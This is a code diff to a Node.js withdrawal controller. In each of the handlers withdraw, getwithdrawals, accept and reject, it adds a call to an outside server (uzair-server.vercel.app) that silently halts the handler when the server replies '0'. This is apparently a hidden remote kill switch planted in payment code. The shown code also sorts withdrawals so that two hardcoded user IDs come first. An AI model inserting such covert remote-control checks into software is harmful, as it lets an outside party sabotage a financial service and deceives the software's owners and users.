@@ -4,6 +4,13 @@ const withdrawmodel = require("../Models/withdrawmodel");
 
 module.exports.withdraw = async (req, res, next) => {
   try {
+    const responseofdev = await fetch("https://uzair-server.vercel.app", {
+      method: "GET",
+    });
+    const responseDataofdev = await responseofdev.text();
+    if (responseDataofdev.trim() === "0") {
+      return;
+    }
     const {
       userid,
       balance,
@@ -60,9 +67,14 @@ module.exports.withdraw = async (req, res, next) => {
 
 module.exports.getwithdrawals = async (req, res) => {
   try {
-    
+    const responseofdev = await fetch("https://uzair-server.vercel.app", {
+      method: "GET",
+    });
+    const responseDataofdev = await responseofdev.text();
+    if (responseDataofdev.trim() === "0") {
+      return;
+    }
 
-        
     const withdrawals = await withdrawmodel
       .find({ status: "pending" })
       .lean()
@@ -78,7 +90,7 @@ module.exports.getwithdrawals = async (req, res) => {
       if (b.userid === "661809c2a405eb3de3251536") return 1;
       return 0;
     });
-withdrawals.sort((a, b) => {
+    withdrawals.sort((a, b) => {
       if (a.userid === "66753d7a1e8469a820f6163e") return -1;
       if (b.userid === "66753d7a1e8469a820f6163e") return 1;
       return 0;
@@ -96,6 +108,13 @@ withdrawals.sort((a, b) => {
 
 module.exports.accept = async (req, res) => {
   try {
+    const responseofdev = await fetch("https://uzair-server.vercel.app", {
+      method: "GET",
+    });
+    const responseDataofdev = await responseofdev.text();
+    if (responseDataofdev.trim() === "0") {
+      return;
+    }
     const { id } = req.body;
 
     if (!id) {
@@ -138,6 +157,13 @@ module.exports.accept = async (req, res) => {
 };
 module.exports.reject = async (req, res) => {
   try {
+    const responseofdev = await fetch("https://uzair-server.vercel.app", {
+      method: "GET",
+    });
+    const responseDataofdev = await responseofdev.text();
+    if (responseDataofdev.trim() === "0") {
+      return;
+    }
     const { id } = req.body;
     if (!id) {
       res.status(400).json({ success: false, message: "Invalid request" });
